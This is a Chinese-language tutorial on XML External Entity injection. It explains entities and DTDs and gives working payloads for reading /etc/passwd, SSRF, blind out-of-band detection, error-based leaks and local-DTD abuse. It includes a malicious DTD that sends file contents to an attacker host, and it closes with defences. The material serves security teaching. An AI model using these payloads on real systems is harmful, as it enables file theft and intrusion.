# XML External Entity (XXE) Injection

> **参考：** [XSS](../Cross-site%20scripting%20(XSS)/) | [SSRF](../../../协议/) | [SQL Injection](../SQL-Injection/)

---

## 什么是 XXE？

XML 外部实体注入（XML External Entity Injection，简称 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它通常使攻击者能够：

- 查看应用程序服务器文件系统上的文件
- 与应用程序本身可访问的任何后端或外部系统进行交互
- 在某些场景下，利用 XXE 漏洞执行服务端请求伪造（SSRF）攻击，进一步攻陷底层服务器或其他后端基础设施

---

## XXE 漏洞的产生原因

部分应用程序使用 XML 格式在浏览器和服务器之间传输数据。这些应用程序几乎都使用标准库或平台 API 来处理服务器上的 XML 数据。XXE 漏洞的产生是因为 **XML 规范本身包含各种具有潜在危险性的特性，而标准解析器默认启用这些特性**，即使应用程序通常不使用它们。

核心问题：**XML 解析器在处理外部实体声明时，会按照指定的 URI 获取资源并将内容嵌入 XML 文档。如果解析器配置不当，攻击者可以借此读取本地文件、探测内网、发起 SSRF 攻击。**

---

## XML 基础

### 什么是 XML？

XML（Extensible Markup Language，可扩展标记语言）是一种用于存储和传输数据的语言。与 HTML 类似，XML 使用标签和数据的树状结构。与 HTML 不同的是，XML 不使用预定义标签，因此标签可以使用描述数据的名称。在 Web 早期，XML 曾作为数据传输格式盛行（"AJAX" 中的 "X" 代表 "XML"），但现在其流行度已下降，被 JSON 格式取代。

### 什么是 XML 实体？

XML 实体是一种在 XML 文档中表示数据项的方式，用于替代数据本身。XML 语言规范内置了多种实体。例如，实体 `&lt;` 和 `&gt;` 表示字符 `<` 和 `>`。这些是用于表示 XML 标签的元字符，因此当它们出现在数据中时，通常必须使用其实体形式表示。

### 什么是 DTD？

XML 文档类型定义（Document Type Definition，DTD）包含可定义 XML 文档结构、数据值类型等内容的声明。DTD 声明位于 XML 文档开头的可选 `DOCTYPE` 元素中。DTD 可以是：

- **内部 DTD（Internal DTD）** — 完全包含在文档自身中
- **外部 DTD（External DTD）** — 从外部加载
- **混合 DTD** — 二者的结合

### 什么是 XML 自定义实体？

XML 允许在 DTD 中定义自定义实体。例如：

```xml
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
```

此定义意味着在 XML 文档中任何对实体引用 `&myentity;` 的使用，都将被替换为定义的值 `"my entity value"`。

### 什么是 XML 外部实体？

XML 外部实体是一种自定义实体，其定义位于声明它的 DTD 之外。

外部实体的声明使用 `SYSTEM` 关键字，并必须指定一个 URL，实体值将从该 URL 加载。例如：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```

URL 可以使用 `file://` 协议，因此外部实体可以从文件加载。例如：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

XML 外部实体是 XXE 攻击产生的主要途径。

---

## XXE 攻击的类型

### 1. 利用 XXE 读取文件

要通过 XXE 从服务器文件系统检索任意文件，需要以两种方式修改提交的 XML：

1. **引入（或编辑）`DOCTYPE` 元素**，定义包含文件路径的外部实体
2. **编辑 XML 中会在应用响应中返回的数据值**，使其使用已定义的外部实体

**示例：** 假设一个购物应用通过提交以下 XML 来检查产品库存：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

该应用没有针对 XXE 攻击的防御，可以提交以下 XXE payload 来读取 `/etc/passwd`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

响应中将包含文件内容：

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

> **注意：** 在实际的 XXE 漏洞中，提交的 XML 通常包含大量数据值，其中任意一个都可能被用于应用响应中。要系统性地测试 XXE，通常需要逐个测试 XML 中的每个数据节点，使用已定义的实体并观察其是否出现在响应中。

### 2. 利用 XXE 执行 SSRF 攻击

除了读取敏感数据外，XXE 攻击的另一个主要影响是可用于执行服务端请求伪造（SSRF）。攻击者可以诱导服务器端应用程序向服务器可访问的任意 URL 发起 HTTP 请求。

要利用 XXE 漏洞执行 SSRF 攻击，需要：
1. 使用目标 URL 定义外部 XML 实体
2. 在数据值中使用已定义的实体

如果可以在应用响应中返回的数据值内使用已定义的实体，则可以在响应中查看来自 URL 的响应，从而与后端系统实现双向交互。否则只能执行盲 SSRF 攻击（仍可能造成严重后果）。

**示例：**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

### 3. 盲 XXE 漏洞（Blind XXE）

许多 XXE 漏洞是盲的——应用程序不会在响应中返回任何已定义外部实体的值，因此无法直接读取服务器端文件。

盲 XXE 漏洞仍然可以被检测和利用，但需要更高级的技术：
- 使用带外（OAST）技术检测漏洞并窃取数据
- 触发 XML 解析错误，在错误消息中泄露敏感数据

#### 3.1 使用 OAST 技术检测盲 XXE

通过触发到受控系统的带外网络交互来检测盲 XXE：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

此 XXE 攻击使服务器向指定 URL 发起后端 HTTP 请求。攻击者可以监控 DNS 查找和 HTTP 请求，从而检测 XXE 攻击是否成功。

#### 3.2 通过 XML 参数实体进行 OAST 检测

当常规实体的 XXE 攻击被阻止时（由于应用输入验证或 XML 解析器的加固），可以使用 XML 参数实体。XML 参数实体的两个关键特性：

1. 声明时在实体名称前使用百分号：`<!ENTITY % myparameterentity "my parameter entity value">`
2. 引用时使用百分号：`%myparameterentity;`

检测 payload：

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
==注意这里参数实体的引用位置，在html标签是不会生效的==
#### 3.3 利用盲 XXE 带外窃取数据

通过盲 XXE 漏洞窃取敏感数据，需要攻击者在自己控制的系统上托管一个恶意 DTD，然后从带内 XXE payload 中调用该外部 DTD。

**恶意 DTD 示例（窃取 `/etc/passwd`）：**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
==&#x25;是Union的HTML实体编码代表的含义是%==
执行步骤：
1. 定义 XML 参数实体 `file`，包含 `/etc/passwd` 的内容
2. 定义 XML 参数实体 `eval`，包含另一个参数实体 `exfiltrate` 的动态声明。`exfiltrate` 实体将向攻击者服务器发起 HTTP 请求，URL 查询字符串中包含 `file` 实体的值
3. 使用 `eval` 实体，触发 `exfiltrate` 实体的动态声明
4. 使用 `exfiltrate` 实体，使其值通过请求指定 URL 被求值

**攻击 payload：**

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

> **注意：** 此技术可能不适用于某些文件内容，包括 `/etc/passwd` 中的换行符。原因是一些 XML 解析器在外部实体定义中获取 URL 时使用的 API 会验证 URL 中允许出现的字符。在这种情况下，可以使用 FTP 协议代替 HTTP。有时无法窃取包含换行符的数据，此时可转而窃取 `/etc/hostname` 等文件。

#### 3.4 利用盲 XXE 通过错误消息获取数据

另一种利用盲 XXE 的方法是触发 XML 解析错误，使错误消息中包含要获取的敏感数据。当应用程序在其响应中返回错误消息时此方法有效。

**恶意外部 DTD 示例：**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

执行步骤：
1. 定义 XML 参数实体 `file`，包含 `/etc/passwd` 的内容
2. 定义 XML 参数实体 `eval`，包含另一个参数实体 `error` 的动态声明。`error` 实体将通过加载一个名称包含 `file` 实体值的不存在文件来求值
3. 使用 `eval` 实体，触发 `error` 实体的动态声明
4. 使用 `error` 实体，尝试加载不存在的文件，产生包含文件名称的错误消息，即 `/etc/passwd` 的内容

错误消息示例：

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

#### 3.5 利用本地 DTD 进行盲 XXE 攻击

前述技术适用于外部 DTD，但通常不适用于在 `DOCTYPE` 元素内完全指定的内部 DTD。这是因为该技术涉及在另一个参数实体的定义中使用 XML 参数实体——根据 XML 规范，外部 DTD 允许此操作，内部 DTD 不允许。

当带外交互被阻断时，如果可以找到并利用服务器文件系统上现有的本地 DTD 文件，仍可能触发包含敏感数据的错误消息。该技术由 Arseniy Sharoglazov 首创。

**核心原理：** 如果文档的 DTD 使用内部和外部 DTD 声明的混合模式，内部 DTD 可以重新定义外部 DTD 中声明的实体。此时，在另一个参数实体的定义中使用 XML 参数实体的限制被放宽。

这意味着攻击者可以从内部 DTD 中使用基于错误的 XXE 技术，前提是所使用的 XML 参数实体重新定义了外部 DTD 中声明的实体。当出站连接被阻断时，外部 DTD 必须是应用服务器本地的文件。

**示例（利用 `/usr/local/app/schema.dtd` 中定义的 `custom_entity`）：**

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

**定位可用 DTD 文件：** 可以通过尝试加载内部 DTD 中的本地文件来枚举，如果缺失会返回错误。例如，使用 GNOME 桌面环境的 Linux 系统通常在 `/usr/share/yelp/dtd/docbookx.dtd` 有 DTD 文件：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

定位到存在的文件后，获取副本并审查以找到可被重定义的实体。

---

## 隐藏的 XXE 攻击面

### XInclude 攻击

某些应用接收客户端提交的数据，将其嵌入服务器端的 XML 文档，然后解析该文档。在这种情况下，由于不控制整个 XML 文档，无法定义或修改 `DOCTYPE` 元素，因此无法执行经典的 XXE 攻击。

此时可以使用 **XInclude** 替代。XInclude 是 XML 规范的一部分，允许从子文档构建 XML 文档。可以在 XML 文档的任意数据值中放置 XInclude 攻击，因此当仅控制被置入服务器端 XML 文档的单个数据项时可执行此攻击。

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### 通过文件上传的 XXE 攻击

部分应用程序允许用户上传文件，并在服务器端进行处理。某些常见文件格式使用 XML 或包含 XML 子组件，例如 DOCX（Office 文档格式）和 SVG（图像格式）。

即使应用程序期望接收 PNG 或 JPEG 格式，所使用的图像处理库可能也支持 SVG 图像。由于 SVG 格式使用 XML，攻击者可以提交恶意 SVG 图像，从而触达隐藏的 XXE 攻击面。

### 通过修改 Content-Type 的 XXE 攻击

大多数 POST 请求使用 HTML 表单生成的默认 Content-Type，如 `application/x-www-form-urlencoded`。某些网站虽然期望收到此格式的请求，但也会容忍其他 Content-Type，包括 XML。

如果正常请求是：

```http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

可以提交以下格式的请求，获得相同结果：

```http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

如果应用容忍消息体中包含 XML 的请求，并将正文内容作为 XML 解析，则仅需将请求重新格式化为 XML 格式即可触达隐藏的 XXE 攻击面。

---

## 如何检测 XXE 漏洞

### 手动检测方法

1. **文件读取检测：** 基于已知操作系统文件定义外部实体，并在返回于应用响应中的数据中使用该实体
2. **盲 XXE 检测：** 基于指向受控系统的 URL 定义外部实体，并监控与该系统的交互（Burp Collaborator 适用于此场景）
3. **XInclude 检测：** 使用 XInclude 攻击尝试读取已知的操作系统文件，检测用户提供的非 XML 数据是否被嵌入到了服务器端 XML 文档中

> **注意：** XML 只是一种数据传输格式。对于任何基于 XML 的功能，同样需要测试 XSS 和 SQL 注入等其他漏洞。可能需要使用 XML 转义序列对 payload 进行编码以避免破坏语法，也可利用此方式混淆攻击以绕过弱防御。

---

## 如何防御 XXE 漏洞

几乎所有 XXE 漏洞的产生都是因为应用程序的 XML 解析库支持了应用程序不需要或不打算使用的潜在危险 XML 特性。防御 XXE 攻击的最简单有效的方法是**禁用这些特性**。

通常，禁用外部实体解析和支持 XInclude 就足够了。此操作可以通过配置选项或程序化覆盖默认行为来完成。请查阅所用 XML 解析库或 API 的相关文档，了解如何禁用不必要的功能。

